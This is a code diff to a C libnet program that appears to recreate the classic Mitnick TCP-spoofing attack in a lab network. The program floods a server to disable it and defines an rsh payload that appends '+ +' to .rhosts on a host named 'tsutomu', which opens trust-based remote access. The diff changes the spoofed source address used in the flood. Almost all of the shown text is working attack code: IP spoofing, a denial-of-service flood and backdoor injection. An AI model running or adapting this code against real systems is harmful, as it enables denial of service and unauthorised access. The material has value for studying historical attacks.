@@ -12,6 +12,7 @@
 #define KEVINIP "172.16.45.2"
 #define SERVERIP "172.16.45.3"
 #define XTERMINALIP "172.16.45.4"
+#define SNIFFIP "172.16.45.5"
 #define SRCPORT 514
 #define DSTPORT 514
 #define EXPLOIT "0\0tsutomu\0tsutomu\0echo + + >> .rhosts"
@@ -29,6 +30,7 @@ int main(int argc, char **argv)
     u_long server;
     u_long xterminal;
     u_long kevin;
+    u_long sniffip;
     //Libnet Context and buffer for storing error
     libnet_t *l;  
     char errbuf[LIBNET_ERRBUF_SIZE];
@@ -65,12 +67,16 @@ int main(int argc, char **argv)
         fprintf(stderr, "Error in kevin ip conversion");
         exit(0);        
     };
-
+    if((sniffip=libnet_name2addr4(l,SNIFFIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
+    {
+        fprintf(stderr, "Error in kevin ip conversion");
+        exit(0);        
+    };
 
     //Server flood
     printf("\nDisabling server...");
     fflush(stdout);
-    disableServer(l,kevin,server);
+    disableServer(l,sniffip,server);
     sleep(1);
     /*
     //Create the pscket sniffer
